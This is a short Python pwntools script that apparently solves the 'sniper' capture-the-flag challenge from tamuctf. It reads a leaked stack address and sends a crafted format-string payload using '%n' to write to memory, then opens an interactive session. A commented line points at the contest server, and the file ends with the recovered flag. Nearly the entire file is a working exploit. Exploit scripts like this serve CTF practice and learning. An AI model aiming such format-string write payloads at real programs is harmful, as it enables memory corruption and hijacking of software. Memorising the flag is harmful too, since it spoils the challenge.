from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./sniper_patched', '''
    b *(vuln+66)
    b *(vuln+98)
    continue
''')

# p = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_sniper")

stack_addr = int(p.recvline().strip().decode(), 16)
log.info(f'stack address: {hex(stack_addr)}')

# Reference: https://blog.redrocket.club/2020/12/23/HXPCTF-Still_Printf/
p.sendline(b'%c'*8+b'%2c%n%11$s'+b'\x00'*6+p64(stack_addr+43)+b'\x00\x00')

p.interactive()

# gigem{you_know_what_maybe_i_should_just_leave_naming_up_to_rng_via_http://ternus.github.io/nsaproductgenerator/}